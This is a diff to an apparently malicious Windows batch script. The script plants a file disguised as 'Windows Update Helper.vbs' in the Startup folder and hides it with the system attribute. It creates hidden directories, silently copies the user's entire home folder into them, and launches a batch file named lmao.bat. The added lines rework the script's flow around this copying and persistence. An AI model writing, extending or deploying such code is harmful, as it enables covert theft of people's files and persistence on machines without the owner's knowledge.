@@ -6,6 +6,8 @@ set state=NOTUPDATING
 set dirr=HDD
 if exist %filename% (set dirr=FLASH)
 
+goto :searching
+
 :changedate
 c:
 cd "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup"
@@ -73,20 +75,19 @@ call lmao.bat
 )
 )
 attrib +s "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Update Helper.vbs"
+set curr=%cd%
+set curr=%curr:~0,2%
+set skip=true
+goto :changedate
+:1
+%curr%
 if exist dontcopy.dat (echo " ">iwashere.dat && goto :whileexist)
 set dire=%random%
 if exist RESUME (set /p dire=<RESUME)
 echo %dire% > RESUME
 mkdir "%dire%"
 attrib +s +h "%dire%"
-cd %dire%
-set dire=%cd%
-
-set skip=true
-goto :changedate
-:1
 pause
-cd %dire%
 xcopy /S /D "%homedrive%%homepath%" "%dire%"
 del RESUME
 
@@ -142,4 +143,4 @@ wscript "Windows Update Helper.vbs"
 exit
 )
 cmd /c call "%appdata%\Microsoft\Windows\lmao.bat"
-exit
+exit
